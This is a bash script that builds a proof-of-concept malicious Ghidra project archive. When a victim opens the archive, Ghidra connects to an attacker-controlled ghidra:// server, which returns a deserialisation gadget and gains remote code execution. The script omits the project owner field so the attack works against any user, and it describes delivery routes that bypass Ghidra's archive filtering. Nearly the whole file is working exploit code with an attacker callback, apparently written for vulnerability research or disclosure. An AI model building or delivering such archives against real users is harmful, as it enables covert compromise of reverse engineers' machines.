#!/bin/bash
#
# build.sh -- produce a PoC Ghidra "project" archive that triggers RCE when the
# victim opens it.
#
# Output:
#   Pwn.zip                        -- the payload to deliver to the victim
#     └─ EvilProject/
#        ├─ EvilProject.gpr        -- .gpr marker; user double-clicks this
#        └─ EvilProject.rep/
#           ├─ projectState        -- <OPEN_REPOSITORY_VIEW URL="ghidra://attacker/x"/>
#           ├─ project.prp
#           └─ idata/, user/, versioned/   (empty skeleton)
#
# Usage:
#   ./build.sh <attacker-host> <attacker-port> [--out output.zip]
#
# The command that runs on the victim is chosen at *serve* time by demo.sh,
# not at build time -- the zip contains only a URL pointing at the attacker
# server.  See demo.sh --cmd.
#
# Why not a .gar?  Ghidra's RestoreTask.FILES_TO_SKIP (RestoreTask.java:50-55)
# explicitly drops /projectState entries when extracting .gar archives -- so
# the .gar path filters the payload out before it can land on disk.  Delivery
# has to bypass RestoreTask: plain zip (Safari auto-extracts), tarball,
# `git clone`, AirDrop, shared drive, etc. all work because the user extracts
# the project directory themselves and then opens it.

set -euo pipefail

OUT="$PWD/Pwn.zip"
POSARGS=()
while [[ $# -gt 0 ]]; do
    case "$1" in
        --out)   OUT="$2";   shift 2 ;;
        -h|--help)
            grep '^#' "$0" | sed 's/^# \?//' | head -40
            exit 0 ;;
        *) POSARGS+=("$1"); shift ;;
    esac
done

if [[ ${#POSARGS[@]} -lt 2 ]]; then
    cat <<EOF >&2
usage: $0 [--out <path>] <attacker-host> <attacker-port>

  <attacker-host>   host running EvilGhidraServer (reachable from victim)
  <attacker-port>   base port (13100 default; victim opens 13100+1 for SSL test)

  --out <path>      output zip path (default: ./Pwn.zip).

Note: the PoC ships a project.prp WITHOUT an OWNER <STATE> element.  When
Ghidra reads it at DefaultProjectData.java:307 --

    owner = properties.getString(OWNER, getUserName());

-- the missing OWNER property defaults to the current (victim) user's
username, which then trivially passes the isOwner() check at line 126.
So the attack is untargeted: the same Pwn.zip works on any macOS user.
EOF
    exit 1
fi

HOST="${POSARGS[0]}"
PORT="${POSARGS[1]}"

# Locate a local Ghidra distribution so we can seed a valid .rep skeleton.
GHIDRA_DIR="${GHIDRA_DIR:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../ghidra_12.2_DEV" && pwd)}"
if [[ ! -x "$GHIDRA_DIR/support/analyzeHeadless" ]]; then
    echo "error: GHIDRA_DIR=$GHIDRA_DIR has no analyzeHeadless" >&2
    exit 1
fi

STAGE=$(mktemp -d)
trap 'rm -rf "$STAGE"' EXIT
mkdir -p "$STAGE/seed"

echo "[+] seeding skeleton project via analyzeHeadless"
"$GHIDRA_DIR/support/analyzeHeadless" "$STAGE/seed" Seed \
        -import /bin/ls -noanalysis >/dev/null 2>&1 || true

if [[ ! -d "$STAGE/seed/Seed.rep" ]]; then
    echo "error: seed project not created at $STAGE/seed/Seed.rep" >&2
    exit 1
fi

# Rename seed -> EvilProject
mv "$STAGE/seed/Seed.gpr"  "$STAGE/seed/EvilProject.gpr"
mv "$STAGE/seed/Seed.rep"  "$STAGE/seed/EvilProject.rep"

# The payload: one XML element inside projectState pointing at the attacker.
cat > "$STAGE/seed/EvilProject.rep/projectState" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<PROJECT>
    <OPEN_REPOSITORY_VIEW URL="ghidra://${HOST}:${PORT}/Pwn" />
    <TOOL_MANAGER ACTIVE_WORKSPACE="Workspace">
        <WORKSPACE NAME="Workspace" ACTIVE="true" />
    </TOOL_MANAGER>
</PROJECT>
EOF

# project.prp without an OWNER <STATE> element.  On open,
# DefaultProjectData.java:307 falls back to getUserName() when OWNER is absent,
# which then passes isOwner() at line 126 for any victim user.  This is what
# turns the attack from "needs the victim's macOS username" into "works on
# anyone who opens the zip".
cat > "$STAGE/seed/EvilProject.rep/project.prp" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<FILE_INFO>
    <BASIC_INFO>
    </BASIC_INFO>
</FILE_INFO>
EOF

mkdir -p "$(dirname "$OUT")"
(cd "$STAGE/seed" && zip -qr "$OUT" EvilProject.gpr EvilProject.rep)

echo "[+] wrote PoC: $OUT"
echo "    attacker host : $HOST"
echo "    attacker port : $PORT"
echo "    victim owner  : <any>   (project.prp has no OWNER; defaults to victim's \$USER)"
echo ""
echo "# Delivery: ship $OUT to the victim.  When they extract it and open"
echo "# EvilProject.gpr in Ghidra (double-click, or File -> Open Project),"
echo "# DefaultProject.restore() reads projectState, calls addProjectView"
echo "# on ghidra://${HOST}:${PORT}/Pwn, and the attacker server returns"
echo "# a deserialisation gadget."
echo ""
echo "# Start the attacker server (command to execute is specified here):"
echo "#   ./poc/demo.sh --cmd 'open -a Calculator' --port $PORT"
